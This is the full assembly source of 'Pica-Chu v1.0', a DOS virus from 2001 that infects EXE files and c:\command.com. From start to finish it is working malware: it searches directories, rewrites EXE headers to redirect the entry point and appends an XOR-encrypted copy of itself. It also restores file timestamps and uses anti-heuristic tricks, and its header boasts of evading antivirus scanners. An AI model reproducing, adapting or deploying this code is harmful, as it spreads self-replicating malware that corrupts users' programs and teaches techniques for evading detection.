comment %
<------------------------------------------------->
Name:		Pica-Chu v1.0
Autor:		-=VR5=-
Country:	(c)Russia
Date:		25.08.2001 - 10.09.2001
Notes:		Assembled with Tasm v4.1
		tasm Pica /m2
		tlink Pica /t
		Not Detected by Scan yet (AVP,DrWeb,NAV)
		Infect 3 *.EXE files in current directory and(or) in SubDirectories
		Infect c:\command.com
		Polymorphic: 16 bit XOR decription
Size:		807 byte
Greetings:	None		
Damage: 	None


<------------------------------------------------->
%

;I'm alone
;Pica Chu - is the best POKEMON
;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
;ÉÍÍÍÍ» Ö  ÉÍÍÍÍ¸ ÉÍÍÍÍÍ»      2001   Ö    · Ö    ·
;º    º º  º      º     º     ÉÍÍÍÍ¸  º    º º    º
;ºÍÍÍÍ¼ º  º      ÌÍÍÍÍÍ¹ ÍÍ  º       ÌÍÍÍÍ¹ º    º
;º      º  º      º     º     º       º    º º    º
;Ó      Ó  ÈÍÍÍÍ¾ Ó     ½     ÈÍÍÍÍ¾  Ó    ½ ÈÍÍÍÍ¼
;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ



.model tiny

Code segment byte
assume cs:code,ds:code,es:code,ss:code

.386

org 100h

 LEN		equ offset OFF - offset Entry
 Decriptor	equ offset EndDeCriptor - offset BeginDeCriptor
 DecSize	equ offset EndDeCriptor - offset Entry
 _IP		equ 14h
 _CS		equ 16h
 _SP		equ 10h
 _SS		equ 0eh
 PageCnt	equ 4h
 PartPag	equ 2h
 HdrSize        equ 8h
 DTATime        equ 16h
 DTADate        equ 18h

Entry:
;-------A Little anti-Heuristic trickÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
push cs                         ;³ save CS register	                   ³
mov bp,sp                       ;³                                         ³
mov bx,ss:[bp]                  ;³  bx = cs	                           ³
push bx                         ;³                                         ³
pop ds                          ;³                                         ³
                                ;³                                         ³
                                ;³                                         ³
call $+3                        ;³ get offet to virus body	           ³
Label1:                         ;³                                         ³
                                ;³                                         ³
pop bp                          ;³                                         ³
sub bp,offset Label1            ;³                                         ³
                                ;³                                         ³
;------------Here the Decriptor ;³                                         ³
BeginDeCriptor:                 ;³                                         ³
                                ;³                                         ³
cmp byte ptr[$+Decriptor],80h   ;³ ¯à®¢¥àï¥¬ § ¯ãé¥­ ®à¨£¨­ « ¨«¨ èâ ¬¬    ³
je DDD                          ;³ ¥á«¨ ®à¨£¨­ «, ¯à®¯ãáª ¥¬ ¤¥ª®¤¨à®¢ ­¨¥ ³
                                ;³                                         ³
                                ;³                                         ³
lea si,[EndDeCriptor + bp]      ;³                                         ³
mov cx,Len - DecSize - 2        ;³                                         ³
mov al,[Checker + bp]           ;³                                         ³
                                ;³                                         ³
add byte ptr [Cript + bp],30h   ;³ selfmodyfying code	                   ³
                                ;³                                         ³
Cript:  db 00h,04h              ;³ -> xor [si],al                          ³
        inc si                  ;³                                         ³
        loop Cript              ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

EndDeCriptor:

;-------return to innocence      ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
sub byte ptr [Cript + bp],30h   ;³ ¢®§¢à é ¥¬ ¢áñ ­  ¬¥áâ®                 ³
DDD:                            ;³                                         ³
;--------------------------     ;³                                         ³
                                ;³                                         ³
                                ;³                                         ³
mov [_ES + bp],es               ;³ save	 es                            	   ³
mov [Flag + bp],0               ;³                                         ³
push cs                         ;³                                         ³
pop es                          ;³ es = cs                                 ³
                                ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

;-------Save for current file
                                ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
lea si,[IP_File + bp]           ;³                                         ³
lea di,[IP_ + bp]               ;³                                         ³
movsd                           ;³                                         ³
movsd                           ;³                                         ³
                                ;³                                         ³
call Main_Code                  ;³ call main code	                   ³
                                ;³                                         ³
Exit:                           ;³                                         ³
int 20h                         ;³ say "good bye"                   	   ³
                                ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
;///////////////SUBROUTINES\\\\\\\\\\\\\\\
Main_Code proc near             ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
                                ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
mov byte ptr[InfectCount + bp],00h
                                ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;-------Get Current Drive------ ;³ get current disk name                   ³
        mov ah,19h              ;³                                         ³
        int  21h                ;³                                         ³
        push ax                 ;³                                         ³
        add al,'A'              ;³                                         ³
                                ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

	mov [PATH + bp],al
        mov word ptr [PATH + 1 + bp],'\:'
                                ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
        cmp al,'A'              ;³ if name = €	                           ³
        jne Cur_Dir             ;³                                         ³
        add al,2                ;³ then goto  ‘                            ³
        jmp _8_                 ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
Cur_Dir:

;-------Get Current Directory
	mov ah,47h
	pop dx
	inc dx
	lea si,[PATH + 3 + bp]
	int 21h

_8_:	
	    lea si,[PATH + bp]
Next_Symbl: lodsb
	    cmp al,0
	    jne Next_Symbl
;-----------si at the end of PATH

	mov word ptr[_SI + bp],si

	
	mov dword ptr [si - 1],'e.*\'	
	mov word ptr [si + 3],'ex'
	mov byte ptr [si + 5],0
	
	
	
	call WorkWithDir
	
	call FindSubDir
	
	
;---------infect c:\command.com
	lea si,[Cmd + bp]
	lea di,[Path + bp]
	mov cx,15		;15=size of "c:\command.com00
	rep movsb
	mov byte ptr [Flag + bp],1
	call InfectExe	
		
	
	call CureEXE

	retn
Main_Code endp

;-----------------------------------------
FindSubDir proc near
;^^^^^^^^^--------------------------------

	
;------Set DTADIR
	mov ah,1ah
	lea dx,[DTADIR + bp]
	int 21h
	
	mov word ptr[si],'.*'
	mov byte ptr[si + 2],0
	
	
;------Find First
	lea dx,[PATH + bp]
	mov cx,10h
	mov ah,4eh
	int 21h
		
	
Next_Sub:	
;------Find Next
	mov ah,4fh
	lea dx,[DTADIR + bp]
	int 21h
	jc NoSubDirs
	cmp [DTADIR + 1eh + bp],'.'
	je Next_Sub
	
	
	mov di,[_SI + bp]
	lea si,[DTADIR + 1eh + bp]
_3_:	
	lodsb
	stosb
	cmp al,0
	jne _3_
	
		
	mov dword ptr [di - 1],'e.*\'	
	mov word ptr [di + 3],'ex'
	mov byte ptr [di + 5],0
	
	mov si,di
	
	call WorkWithDir
	
;------Set DTADIR
	mov ah,1ah
	lea dx,[DTADIR + bp]
	int 21h	
	
	
	jmp Next_Sub
	
	

NoSubDirs:
	
	retn
FindSubDir endp	

;-----------------------------------------
WorkWithDir proc near	;Input: PATH = Directory + *.exe
;^^^^^^^^^^-------------------------------

;-------Set DTA
	mov ah,1ah
	lea dx,[DTA + bp]
	int 21h

;-------Find First
	lea dx,[PATH + bp]
	mov cx,10h
	mov ah,4eh
	int 21h
	jc _EX
	
Infect:
	
;-------Infect File	
	cmp [InfectCount + bp],3h
	jae Not_Infect

	push si
	call InfectEXE
	pop si
Not_Infect:	
		
	
;-------Find Next
	mov ah,4fh
	lea dx,[DTA + bp]
	int 21h
	jc _EX
	jmp Infect
	
	
_EX:
	retn
WorkWithDir endp

;-----------------------------------------
InfectEXE proc near
;^^^^^^^^---------------------------------

;-------Calculate full path to file
	cmp byte ptr [Flag + bp],1
	je Op
	
	mov di,si
	lea si,[DTA + 1eh + bp]
_2_:
	lodsb
	stosb
	cmp al,0
	jne _2_	

	
;-------Open for Read/Write
Op:		
	mov ax,3d02h
	lea dx,[PATH + bp]
	int 21h
	jnc Opend
	
	retn
	
Opend:
	
;-------Read Header
	xchg ax,bx	
	mov ah,3fh
	mov cx,1ch
	lea dx,[Header + bp]
	int 21h

;-------Check If EXE
	cmp word ptr[Header + bp],'ZM'
	jne CloseF

	
;-------Check Infection

	mov ax,4202h
	mov cx,-1
	mov dx,-2
	int 21h
	
	mov ah,3fh
	mov cx,2
	lea dx,[CHK + bp]
	int 21h
	
	mov al,byte ptr[CHK + bp]
	add al,byte ptr[CHK + bp + 1]
	cmp al,0FFh
	je CloseF
	
;--------Get File Size
	mov ax,4202h
	xor cx,cx
	xor dx,dx
	int 21h
	push ax
	push dx

;--------Check for overlays
	mov si,ax
	mov ax,word ptr[Header + PageCnt + bp]
	dec ax
	mov cx,512
	mul cx
	add ax,word ptr[Header + PartPag + bp]
	cmp ax,si
	
	jz M1
	pop dx
	pop ax
	jmp CloseF
M1:

	pop dx
	pop ax
	
	push ax
	push dx
	
;--------Calculate new file size in paragraphs
	add ax,Len
	adc dx,0
	mov cx,512
	div cx
	or dx,dx
	jz New_Len
	inc ax
New_len:

;-------Save File size in header
	mov word ptr [Header + PageCnt + bp],ax
	mov word ptr [Header + PartPag + bp],dx

;-------Save Info from Header
	

	lea si,[Header + _IP + bp]
	lea di,[IP_File + bp]
	movsw
	lea si,[Header + _CS + bp]
	lea di,[CS_File + bp]
	movsw
	lea si,[Header + _SS + bp]
	lea di,[SS_File + bp]
	movsw
	lea si,[Header + _SP + bp]
	lea di,[SP_File + bp]
	movsw

	
;-------Calculate New Entry Point
	pop dx
	pop ax
	
	
	sub ax,100h
	mov cx,10h
	div cx
	
	add dx,100h
	
	sub ax,word ptr [Header + HdrSize + bp]

	
	mov word ptr [Header + _CS + bp],ax
	mov word ptr [Header + _IP + bp],dx
	mov word ptr [Header + _SS + bp],ax
	mov word ptr [Header + _SP + bp],2000h
	
;-------Write Back Header
	mov ax,4200h
	xor cx,cx
	xor dx,dx
	int 21h
	
	mov ah,40h
	lea dx,[Header + bp]
	mov cx,1ch
	int 21h

;-------Generate Checker
	;call Random
	mov ah,2ch
	int 21h
	
	add dl,dh
	add dl,cl
	add dl,ch
	
	mov byte ptr[Checker + bp],dl
	
	mov al,255
	sub al,dl
	mov byte ptr [Checker + bp + 1],al

	
;-------Write Virus Body to End
	lea si,[Entry + bp]
	lea di,[Cripted + bp]
	mov cx,DecSize
	
_6_:	
	rep
	movsb
	

;-------Encript Body
	mov cx,LEN - DecSize - 2
	
_5_:
		
	lodsb
	xor al,[Checker + bp]
	stosb
	dec cx
	cmp cx,0
	jne _5_
	movsw
;--------------------	
	
	mov ax,4202h
	xor cx,cx
	xor dx,dx
	int 21h
	
	mov ah,40h
	lea dx,[Cripted + bp]
	mov cx,len
	int 21h
	
	
	inc [InfectCount + bp]
CloseF:

;-------Set Back Date and Time
	mov ax,5701h
	mov cx,word ptr [DTA + DTATime + bp]
	mov dx,word ptr [DTA + DTADate + bp]
	int 21h
	
;------Set Back Atributes
		
		
;-------Close File
	mov ah,3eh
	int 21h
	
	
	retn

InfectEXE endp
;-----------------------------------------

CureEXE proc near
;-------Take command to Main Program

;--------Set OLD DTA
	mov ah,1ah
	mov dx,80h
	int 21h	
;Compare if original source running
	cmp bp,0
	
	jne ExT
	
	retn
ExT:
	cmp byte ptr [Checker + bp],0FCh
	jle NoMess

	mov ah,09h
	lea dx,[NM + bp]
	int 21h
	
NoMess:	
;---------------------------------------------	
	
	
	
	mov ax,[_ES + bp]
	mov es,ax
	
	add ax,10h
	add word ptr [CS_ + bp],ax
	
	mov ax,word ptr[CS_ + bp]
	sub ax,10h
	mov ds,ax
		
	cli
	add ax,word ptr cs:[SS_ + bp]
	mov ss,ax
	mov sp,word ptr cs:[SP_ + bp]
	sti
	
;-----------------------------------------
		
	;Nullify registers
	xor ax,ax
   	xor bx,bx
	xor cx,cx
   	xor dx,dx
   	xor si,si
   	xor di,di
   	xor bp,bp
   	
	       db 0eah
EXEJump:   IP_ dw 00h
	   CS_ dw 00h
	   SS_ dw 00h
	   SP_ dw 00h
	
   	
CureEXE endp


;///////////////////DATA\\\\\\\\\\\\\\\\\\

NM	db 'Pica-Chu is the BEST Pokemon',0Dh,0Ah,'$'
	db 'Autor: VR5',0
Cmd	db 'c:\command.com',0


IP_File		dw 9090h
CS_File		dw 9090h
SS_File		dw 9090h
SP_File		dw 9090h

;///////////////DATA\\\\\\\\\\\\\\\\\\\\\\

Checker		db 250
		db 5
OFF:
_ES		dw ?
_DS		dw ?
_SI		dw ?
InfectCount	db ?
Flag		db ?
AttrAndDate	db   5 dup (?)
DTA		db 128 dup (?)
DTADIR		db 128 dup (?)
Header		db 1ch dup (?)
CHK		dw ?
FULLPATH	db 100 dup (?)
PATH		db 100 dup (?)
Cripted		db ?

ends Code
end Entry